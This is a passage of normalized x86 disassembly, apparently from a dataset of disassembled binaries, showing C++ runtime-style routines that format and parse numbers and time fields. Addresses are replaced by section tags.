mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1003f1ef
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10024bfa
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100443ba
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn 0x18
sub_100469bb
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1003f1ef
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10024bfa
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100443ba
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn 0x18
sub_10046a29
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1003f1ef
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10024bfa
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100443ba
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn 0x1c
sub_10046a9a
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1003f1ef
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10024bfa
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100443ba
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn 0x1c
sub_10046b0b
mov edi edi
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x84 ] ecx
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
mov [ ebp - 0x88 ] eax
push edi
mov eax 0x2000
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ ebp - 0x8 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
fld [ ebp + 0x1c ]
sub edi [ ebp - 0x8 ]
mov edx ecx
and edx 0x3000
mov [ ebp - 0x80 ] ebx
cmp edx eax
jne r-xdata
mov [ ebp - 0x8 ] edi
push 0x6
pop ecx
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x84 ]
call sub_1003f188
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_10024bfa
push eax
push edi
push ebx
push [ ebp - 0x80 ]
lea eax [ ebp - 0x78 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x88 ]
push [ ebp - 0x84 ]
call sub_10043f6e
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x88 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn 0x1c
fld [ r--data ]
fmul st1
fucomp st1
fnstsw ax
test ah 0x44
jpo r-xdata
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov [ ebp - 0x79 ] bl
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp edi edx
jl r-xdata
fchs
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx 0x1388
jae r-xdata
sub edi edx
fmul st1
add ebx edx
jmp r-xdata
sub_10046c7e
mov edi edi
push ebp
mov ebp esp
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x88 ] ecx
mov ecx [ esi + 0x14 ]
mov [ ebp - 0x8c ] eax
push edi
mov eax 0x2000
test ecx ecx
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ ebp - 0x8 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
sub edi [ ebp - 0x8 ]
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov edx ecx
and edx 0x3000
cmp edx eax
jne r-xdata
mov [ ebp - 0x8 ] edi
push 0x6
pop ecx
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
fld [ r--data ]
push ebx
fcom st1
push 0xa
mov ebx 0x1388
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] ebx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
pop ebx
je r-xdata
cmp edi edx
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x88 ]
call sub_1003f188
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_10024bfa
push eax
push edi
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x8c ]
push [ ebp - 0x88 ]
call sub_10043f6e
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8c ]
add esp 0x44
pop edi
xor ecx ebp
pop esi
call sub_100242d7
leave
retn 0x1c
fchs
jmp r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp [ ebp - 0x84 ] ebx
jae r-xdata
sub edi edx
fmul st1
add [ ebp - 0x84 ] edx
jmp r-xdata
sub_10046dee
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_10024bfa
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_100443ba
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn 0x18
sub_10046e4b
push 0x54
mov eax sub_1004c5cc
call sub_1002826c
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
mov esi ecx
mov ecx [ ebp + 0x28 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x60 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x5c ] ebx
call sub_100445a6
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ edi ] 0x1
add esi 0x8
push esi
push 0x0
push 0x30
call sub_1003e793
add esp 0xc
lea ecx [ ebp - 0x48 ]
movzx ebx ax
call sub_10003d21
push [ ebp - 0x18 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_100084a7
xor esi esi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1003f83c
cmp [ eax ] bx
jb r-xdata
or [ edi ] 0x2
jmp r-xdata
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_10007a24
push esi
lea ecx [ ebp - 0x2c ]
call sub_1003f83c
movzx eax [ eax ]
movzx ecx bx
add ecx 0x9
cmp ecx eax
jge r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_100400d2
mov eax ebx
call sub_100282ef
retn 0x24
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
mov [ ebp - 0x49 ] 0x30
sub [ ebp - 0x49 ] bl
cmp esi [ ebp - 0x18 ]
jae r-xdata
lea eax [ ebp - 0x50 ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x50 ] ebx
call sub_1002406c
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x44 ]
push esi
lea ecx [ ebp - 0x2c ]
call sub_1003f83c
mov al [ eax ]
add al [ ebp - 0x49 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x58 ] al
push [ ebp - 0x58 ]
push 0x1
call sub_10007a24
inc esi
cmp esi [ ebp - 0x18 ]
jb r-xdata
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x50 ] ebx
jne r-xdata
mov eax [ ebp - 0x60 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10002020
mov ebx [ ebp - 0x5c ]
sub_10046f9d
push 0x20
mov eax sub_1004c5f9
call sub_1002826c
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_100445a6
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10040636
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_100400d2
mov eax edi
call sub_100282ef
retn 0x24
sub_1004701c
push 0x54
mov eax sub_1004c626
call sub_1002826c
fldz
xor ebx ebx
fcomp [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x60 ] bl
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x58 ] ebx
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jpe r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x60 ] 0x1
fchs
fstp [ ebp + 0x20 ]
lea ecx [ ebp - 0x54 ]
fstp st0
call sub_100403af
fld [ ebp + 0x20 ]
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_10024bfa
add esp 0x14
xor esi esi
cmp eax ebx
mov [ ebp - 0x5c ] eax
jle r-xdata
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
call sub_1003e793
movzx eax ax
add esp 0xc
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_10040544
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_10040cc9
push [ ebp - 0x60 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10044e24
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_100400d2
mov eax [ ebp + 0x8 ]
call sub_100282ef
retn 0x20
lea eax [ edi + 0x8 ]
push eax
movzx eax [ ebp + esi - 0x38 ]
push ebx
push eax
call sub_1003e793
movzx eax ax
add esp 0xc
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10040544
inc esi
cmp esi [ ebp - 0x5c ]
jl r-xdata
fld [ ebp + 0x20 ]
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fstp [ ebp + 0x20 ]
fld [ ebp + 0x20 ]
fcomp st1
fnstsw ax
test ah 0x1
je r-xdata
sub_1004713c
push 0x2c
mov eax sub_1004c653
call sub_1002826c
mov esi [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x34 ] edi
add edi 0x8
push edi
push 0x0
push 0x30
call sub_1003e793
add esp 0xc
cmp [ esi + 0x18 ] 0x8
movzx ebx ax
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
movzx eax [ esi ]
cmp bx ax
ja r-xdata
inc esi
mov [ ebp - 0x30 ] 0x1
inc esi
push edi
xor edi edi
push edi
push 0x2d
mov [ ebp - 0x30 ] 0x0
call sub_1003e793
add esp 0xc
cmp [ esi ] ax
jne r-xdata
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10040c4e
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
movzx ecx bx
movzx eax ax
add ecx 0x9
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x38 ] esp
push eax
call sub_10040cc9
push [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10044e24
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100400d2
mov eax [ ebp + 0x8 ]
call sub_100282ef
retn 0x1c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10040544
inc edi
movzx eax [ esi + edi * 2 ]
cmp bx ax
jbe r-xdata
movzx eax ax
cmp eax ecx
jg r-xdata
sub_10047212
push 0x4
mov eax sub_1004bea9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_10045372
mov eax esi
call sub_100282db
retn 0x8
sub_10047261
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10047249
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10047282
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
lea ebx [ eax + 0x14 ]
push ebx
mov [ ebp - 0x28 ] ecx
mov ecx [ ebp + 0x1c ]
push 0x0
push 0x30
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ebx
call sub_1003e793
add esp 0xc
push [ ebp - 0x28 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x2c ] eax
lea edi [ ebp - 0x24 ]
call sub_1003fe92
test al al
jne r-xdata
push [ ebp - 0x28 ]
xor bl bl
push esi
call sub_10040264
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push 0x0
push 0x2b
call sub_1003e793
add esp 0xc
mov ecx esi
mov bx ax
call sub_10040010
cmp ax bx
jne r-xdata
push [ ebp - 0x28 ]
push esi
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_10040010
cmp ax [ ebp - 0x2c ]
jne r-xdata
push [ ebp - 0x34 ]
push 0x0
push 0x2d
call sub_1003e793
add esp 0xc
mov ecx esi
mov bx ax
call sub_10040010
cmp ax bx
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
mov ecx esi
call sub_10040010
cmp [ ebp - 0x2c ] ax
ja r-xdata
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ecx esi
mov bl 0x1
call sub_1003fdb2
push [ ebp - 0x28 ]
push esi
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebp - 0x24 ] 0x2d
mov ecx esi
lea edi [ ebp - 0x23 ]
call sub_1003fdb2
mov ecx esi
call sub_10040010
movzx ecx [ ebp - 0x2c ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
push 0xa
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ edi ] 0x0
mov [ ebp - 0x30 ] ebx
call sub_10023c74
add esp 0x10
push [ ebp - 0x28 ]
mov ecx esi
mov edi eax
call sub_1003fe92
test al al
je r-xdata
lea edi [ ebp - 0x24 ]
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov ecx esi
call sub_10040010
mov cl 0x30
sub cl [ ebp - 0x2c ]
add al cl
mov [ edi ] al
lea eax [ ebp - 0x5 ]
cmp edi eax
jae r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x3c ] eax
je r-xdata
inc ebx
mov ecx esi
mov bl 0x1
call sub_1003fdb2
inc edi
or ebx 0x2
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
cmp edi [ ebp + 0x14 ]
jl r-xdata
cmp [ ebp + 0x18 ] edi
jl r-xdata
mov eax [ ebp - 0x38 ]
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
sub_1004741c
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x14 ]
push eax
push 0x0
push 0x3a
call sub_1003e793
mov ebx [ ebp + 0x24 ]
movzx eax ax
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x8 ]
push eax
push 0x17
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10047282
mov esi [ ebp + 0x20 ]
add esp 0x24
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0x4 ]
jne r-xdata
or [ esi ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003fdb2
lea eax [ ebx + 0x4 ]
push eax
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10047282
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003fdb2
push ebx
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10047282
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_100474e0
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x14 ]
push esi
xor ebx ebx
push ebx
push 0x30
call sub_1003e793
push esi
movzx eax ax
push ebx
push 0x3a
mov [ ebp - 0x8 ] eax
call sub_1003e793
push esi
movzx eax ax
push ebx
push 0x2c
mov [ ebp - 0x10 ] eax
call sub_1003e793
push esi
movzx eax ax
push ebx
push 0x2f
mov [ ebp - 0x14 ] eax
call sub_1003e793
push esi
movzx eax ax
push ebx
push 0x20
mov [ ebp - 0x18 ] eax
call sub_1003e793
movzx eax ax
mov [ ebp - 0xc ] eax
mov eax [ edi ]
add esp 0x3c
mov ecx edi
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
mov ebx [ ebp + 0x24 ]
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10040264
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100457ef
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10040010
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003fdb2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0x10 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003fdb2
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0x14 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
lea eax [ ebx + 0x10 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10047282
or [ esi ] eax
add esp 0x18
dec [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0x18 ]
jne r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10045818
jmp r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10047282
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10040264
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10040010
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003fdb2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0x10 ]
je r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100457ef
cmp [ ebp - 0x4 ] 0x4
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003fdb2
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0x14 ]
je r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
lea eax [ ebx + 0x10 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10047282
or [ esi ] eax
add esp 0x18
dec [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
or [ esi ] 0x2
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10040010
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10047282
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10040010
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100457ef
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
